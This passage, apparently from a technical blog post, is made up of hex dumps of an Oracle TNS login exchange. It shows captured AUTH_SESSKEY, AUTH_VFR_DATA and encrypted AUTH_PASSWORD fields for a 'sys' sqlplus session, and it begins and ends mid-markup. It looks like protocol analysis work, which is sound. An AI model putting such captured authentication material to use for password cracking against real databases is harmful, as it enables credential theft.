class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">4</span>b <span class="hljs-number">45</span> <span class="hljs-number">59</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>  ..AUTH_SESSKEY`.<br><span class="hljs-attribute">0020</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">60</span> <span class="hljs-number">35</span> <span class="hljs-number">32</span> <span class="hljs-number">46</span> <span class="hljs-number">43</span> <span class="hljs-number">30</span> <span class="hljs-number">34</span> <span class="hljs-number">42</span> <span class="hljs-number">31</span> <span class="hljs-number">46</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span>  ..`<span class="hljs-number">52</span>FC04B1FF811<br><span class="hljs-attribute">0030</span>   <span class="hljs-number">30</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">36</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">35</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">36</span> <span class="hljs-number">31</span> <span class="hljs-number">41</span> <span class="hljs-number">37</span>  <span class="hljs-number">0</span>CA1263DF5BC61A7<br><span class="hljs-attribute">0040</span>   <span class="hljs-number">45</span> <span class="hljs-number">35</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">43</span> <span class="hljs-number">38</span> <span class="hljs-number">41</span> <span class="hljs-number">35</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">44</span> <span class="hljs-number">32</span> <span class="hljs-number">32</span>  E57740C8A5111D22<br><span class="hljs-attribute">0050</span>   <span class="hljs-number">42</span> <span class="hljs-number">34</span> <span class="hljs-number">31</span> <span class="hljs-number">45</span> <span class="hljs-number">35</span> <span class="hljs-number">33</span> <span class="hljs-number">43</span> <span class="hljs-number">43</span> <span class="hljs-number">31</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">32</span> <span class="hljs-number">41</span>  B41E53CC167FDF2A<br><span class="hljs-attribute">0060</span>   <span class="hljs-number">36</span> <span class="hljs-number">38</span> <span class="hljs-number">37</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">38</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">44</span> <span class="hljs-number">39</span> <span class="hljs-number">42</span> <span class="hljs-number">32</span> <span class="hljs-number">42</span> <span class="hljs-number">36</span>  <span class="hljs-number">6878958200</span>D9B2B6<br><span class="hljs-attribute">0070</span>   <span class="hljs-number">41</span> <span class="hljs-number">35</span> <span class="hljs-number">31</span> <span class="hljs-number">43</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">44</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">39</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">42</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span>  A51C95D779FDEBAB<br><span class="hljs-attribute">0080</span>   <span class="hljs-number">42</span> <span class="hljs-number">36</span> <span class="hljs-number">39</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span>  B69.........AUTH<br><span class="hljs-attribute">0090</span>   <span class="hljs-number">5</span>f <span class="hljs-number">56</span> <span class="hljs-number">46</span> <span class="hljs-number">52</span> <span class="hljs-number">5</span>f <span class="hljs-number">44</span> <span class="hljs-number">41</span> <span class="hljs-number">54</span> <span class="hljs-number">41</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">34</span> <span class="hljs-number">33</span>  _VFR_DATA.....<span class="hljs-number">43</span><br><span class="hljs-attribute">00a0</span>   <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">42</span> <span class="hljs-number">45</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">42</span> <span class="hljs-number">33</span> <span class="hljs-number">32</span> <span class="hljs-number">42</span> <span class="hljs-number">30</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">37</span> <span class="hljs-number">36</span> <span class="hljs-number">45</span>  E0BE20B32B0BB76E<br><span class="hljs-attribute">00b0</span>   <span class="hljs-number">35</span> <span class="hljs-number">37</span> <span class="hljs-number">25</span> <span class="hljs-number">1</span>b <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">57</span>%.............<br><span class="hljs-attribute">00c0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">00d0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">00e0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">00f0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                          ........<br></code></pre></td></tr></table></figure><p>(2) server &lt;- client</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>   <span class="hljs-number">03</span> <span class="hljs-number">73</span> <span class="hljs-number">03</span> d0 <span class="hljs-number">1</span>a <span class="hljs-number">05</span> <span class="hljs-number">0</span>a <span class="hljs-number">09</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">21</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">44</span>  .s.........!...D<br><span class="hljs-attribute">0010</span>   <span class="hljs-number">46</span> bf bf <span class="hljs-number">0</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ec <span class="hljs-number">42</span> bf bf d8 <span class="hljs-number">53</span> bf bf <span class="hljs-number">03</span>  F.......B...S...<br><span class="hljs-attribute">0020</span>   <span class="hljs-number">73</span> <span class="hljs-number">79</span> <span class="hljs-number">73</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span>  sys$....AUTH_SES<br><span class="hljs-attribute">0030</span>   <span class="hljs-number">53</span> <span class="hljs-number">4</span>b <span class="hljs-number">45</span> <span class="hljs-number">59</span> <span class="hljs-number">20</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> fe <span class="hljs-number">40</span> <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">36</span> <span class="hljs-number">44</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span>  SKEY ....@FA6DCD<br><span class="hljs-attribute">0040</span>   <span class="hljs-number">30</span> <span class="hljs-number">46</span> <span class="hljs-number">33</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">45</span> <span class="hljs-number">39</span> <span class="hljs-number">32</span> <span class="hljs-number">44</span> <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span>  <span class="hljs-number">0</span>F389E92D18F8188<br><span class="hljs-attribute">0050</span>   <span class="hljs-number">45</span> <span class="hljs-number">43</span> <span class="hljs-number">36</span> <span class="hljs-number">39</span> <span class="hljs-number">33</span> <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">42</span> <span class="hljs-number">35</span> <span class="hljs-number">32</span> <span class="hljs-number">34</span> <span class="hljs-number">46</span> <span class="hljs-number">34</span> <span class="hljs-number">32</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span>  EC69313B524F4211<br><span class="hljs-attribute">0060</span>   <span class="hljs-number">38</span> <span class="hljs-number">34</span> <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span> <span class="hljs-number">39</span> <span class="hljs-number">36</span> <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">37</span> <span class="hljs-number">32</span> <span class="hljs-number">46</span> <span class="hljs-number">43</span>  <span class="hljs-number">84</span>FAE679613A72FC<br><span class="hljs-attribute">0070</span>   <span class="hljs-number">38</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">30</span> <span class="hljs-number">41</span> <span class="hljs-number">34</span> <span class="hljs-number">43</span> <span class="hljs-number">37</span> <span class="hljs-number">42</span> <span class="hljs-number">20</span> <span class="hljs-number">42</span> <span class="hljs-number">39</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">36</span>  <span class="hljs-number">8</span>DFD0A4C7B B93A6<br><span class="hljs-attribute">0080</span>   <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">42</span> <span class="hljs-number">38</span> <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">35</span> <span class="hljs-number">42</span> <span class="hljs-number">38</span> <span class="hljs-number">32</span> <span class="hljs-number">35</span> <span class="hljs-number">38</span> <span class="hljs-number">41</span> <span class="hljs-number">30</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span>  ACB8E05B8258A020<br><span class="hljs-attribute">0090</span>   <span class="hljs-number">44</span> <span class="hljs-number">32</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">34</span> <span class="hljs-number">45</span> <span class="hljs-number">43</span> <span class="hljs-number">31</span> <span class="hljs-number">42</span> <span class="hljs-number">36</span> <span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  D2954EC1B63.....<br><span class="hljs-attribute">00a0</span>   <span class="hljs-number">27</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">50</span> <span class="hljs-number">41</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">57</span> <span class="hljs-number">4</span>f  &#x27;....AUTH_PASSWO<br><span class="hljs-attribute">00b0</span>   <span class="hljs-number">52</span> <span class="hljs-number">44</span> c0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">32</span> <span class="hljs-number">43</span> <span class="hljs-number">35</span> <span class="hljs-number">46</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">37</span> <span class="hljs-number">41</span> <span class="hljs-number">36</span>  RD....@<span class="hljs-number">2</span>C5F957A6<br><span class="hljs-attribute">00c0</span>   <span class="hljs-number">35</span> <span class="hljs-number">33</span> <span class="hljs-number">32</span> <span class="hljs-number">41</span> <span class="hljs-number">44</span> <span class="hljs-number">39</span> <span class="hljs-number">31</span> <span class="hljs-number">44</span> <span class="hljs-number">39</span> <span class="hljs-number">31</span> <span class="hljs-number">36</span> <span class="hljs-number">46</span> <span class="hljs-number">34</span> <span class="hljs-number">45</span> <span class="hljs-number">35</span> <span class="hljs-number">46</span>  <span class="hljs-number">532</span>AD91D916F4E5F<br><span class="hljs-attribute">00d0</span>   <span class="hljs-number">41</span> <span class="hljs-number">37</span> <span class="hljs-number">44</span> <span class="hljs-number">32</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">41</span> <span class="hljs-number">30</span> <span class="hljs-number">45</span> <span class="hljs-number">36</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">46</span> <span class="hljs-number">42</span> <span class="hljs-number">41</span>  A7D2FDA0E6CDFFBA<br><span class="hljs-attribute">00e0</span>   <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">44</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">33</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">46</span> <span class="hljs-number">34</span> <span class="hljs-number">46</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">43</span> <span class="hljs-number">38</span>  AED883CAF4F200C8<br><span class="hljs-attribute">00f0</span>   <span class="hljs-number">39</span> <span class="hljs-number">38</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span>  <span class="hljs-number">983</span>AE3D.........<br><span class="hljs-attribute">0100</span>   <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">52</span> <span class="hljs-number">54</span> <span class="hljs-number">54</span> <span class="hljs-number">0</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">36</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span>  AUTH_RTT.....<span class="hljs-number">667</span><br><span class="hljs-attribute">0110</span>   <span class="hljs-number">30</span> <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">27</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f  <span class="hljs-number">08</span>....&#x27;....AUTH_<br><span class="hljs-attribute">0120</span>   <span class="hljs-number">43</span> <span class="hljs-number">4</span>c <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">5</span>f <span class="hljs-number">4</span>d <span class="hljs-number">45</span> <span class="hljs-number">4</span>d <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">39</span>  CLNT_MEM.....<span class="hljs-number">409</span><br><span class="hljs-attribute">0130</span>   <span class="hljs-number">36</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">27</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">54</span>  <span class="hljs-number">6</span>....&#x27;....AUTH_T<br><span class="hljs-attribute">0140</span>   <span class="hljs-number">45</span> <span class="hljs-number">52</span> <span class="hljs-number">4</span>d <span class="hljs-number">49</span> <span class="hljs-number">4</span>e <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">12</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">70</span> <span class="hljs-number">74</span> <span class="hljs-number">73</span> <span class="hljs-number">2</span>f  ERMINAL.....pts/<br><span class="hljs-attribute">0150</span>   <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>f <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f  <span class="hljs-number">18</span>....-....AUTH_<br><span class="hljs-attribute">0160</span>   <span class="hljs-number">50</span> <span class="hljs-number">52</span> <span class="hljs-number">4</span>f <span class="hljs-number">47</span> <span class="hljs-number">52</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>d <span class="hljs-number">5</span>f <span class="hljs-number">4</span>e <span class="hljs-number">4</span>d <span class="hljs-number">51</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>b <span class="hljs-number">73</span>  PROGRAM_NMQ....s<br><span class="hljs-attribute">0170</span>   <span class="hljs-number">71</span> <span class="hljs-number">6</span>c <span class="hljs-number">70</span> <span class="hljs-number">6</span>c <span class="hljs-number">75</span> <span class="hljs-number">73</span> <span class="hljs-number">40</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">28</span>  qlplus@henices (<br><span class="hljs-attribute">0180</span>   <span class="hljs-number">54</span> <span class="hljs-number">4</span>e <span class="hljs-number">53</span> <span class="hljs-number">20</span> <span class="hljs-number">56</span> <span class="hljs-number">31</span> <span class="hljs-number">2</span>d <span class="hljs-number">56</span> <span class="hljs-number">33</span> <span class="hljs-number">29</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span>  TNS V1-V3)....$.<br><span class="hljs-attribute">0190</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">4</span>d <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>e <span class="hljs-number">45</span> <span class="hljs-number">15</span>  ...AUTH_MACHINE.<br><span class="hljs-attribute">01a0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span>  ....henices.....<br><span class="hljs-attribute">01b0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">50</span> <span class="hljs-number">49</span> <span class="hljs-number">44</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ....AUTH_PID....<br><span class="hljs-attribute">01c0</span>   <span class="hljs-number">04</span> <span class="hljs-number">36</span> <span class="hljs-number">32</span> <span class="hljs-number">32</span> <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span>  .<span class="hljs-number">6228</span>.........AU<br><span class="hljs-attribute">01d0</span>   <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">44</span> <span class="hljs-number">15</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">07</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">69</span> <span class="hljs-number">63</span>  TH_SID.....henic<br><span class="hljs-attribute">01e0</span>   <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f  es.........AUTH_<br><span class="hljs-attribute">01f0</span>   <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">4</span>c <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">34</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ACL.....<span class="hljs-number">4400</span>....<br><span class="hljs-attribute">0200</span>   <span class="hljs-number">36</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">12</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">54</span> <span class="hljs-number">45</span> <span class="hljs-number">52</span> <span class="hljs-number">5</span>f  <span class="hljs-number">6</span>....AUTH_ALTER_<br><span class="hljs-attribute">0210</span>   <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">6</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">25</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">54</span> <span class="hljs-number">45</span>  SESSIONo...%ALTE<br><span class="hljs-attribute">0220</span>   <span class="hljs-number">52</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">54</span> <span class="hljs-number">20</span> <span class="hljs-number">54</span> <span class="hljs-number">49</span>  R SESSION SET TI<br><span class="hljs-attribute">0230</span>   <span class="hljs-number">4</span>d <span class="hljs-number">45</span> <span class="hljs-number">5</span>f <span class="hljs-number">5</span>a <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">45</span> <span class="hljs-number">3</span>d <span class="hljs-number">27</span> <span class="hljs-number">2</span>b <span class="hljs-number">30</span> <span class="hljs-number">38</span> <span class="hljs-number">3</span>a <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">27</span>  ME_ZONE=&#x27;+<span class="hljs-number">08</span>:<span class="hljs-number">00</span>&#x27;<br><span class="hljs-attribute">0240</span>   <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">17</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">4</span>c  .....E....AUTH_L<br><span class="hljs-attribute">0250</span>   <span class="hljs-number">4</span>f <span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>f <span class="hljs-number">4</span>e <span class="hljs-number">5</span>f <span class="hljs-number">49</span>  OGICAL_SESSION_I<br><span class="hljs-attribute">0260</span>   <span class="hljs-number">44</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">30</span> <span class="hljs-number">41</span>  D`... CAA893AC0A<br><span class="hljs-attribute">0270</span>   <span class="hljs-number">34</span> <span class="hljs-number">33</span> <span class="hljs-number">30</span> <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">30</span> <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">37</span> <span class="hljs-number">46</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span>  <span class="hljs-number">430</span>FA0E040007F01<br><span class="hljs-attribute">0280</span>   <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">35</span> <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">41</span>  <span class="hljs-number">011854</span>....<span class="hljs-number">0</span>....A<br><span class="hljs-attribute">0290</span>   <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">49</span> <span 